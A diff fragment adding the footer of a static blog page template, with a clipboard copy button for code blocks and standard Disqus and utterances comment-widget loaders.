+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
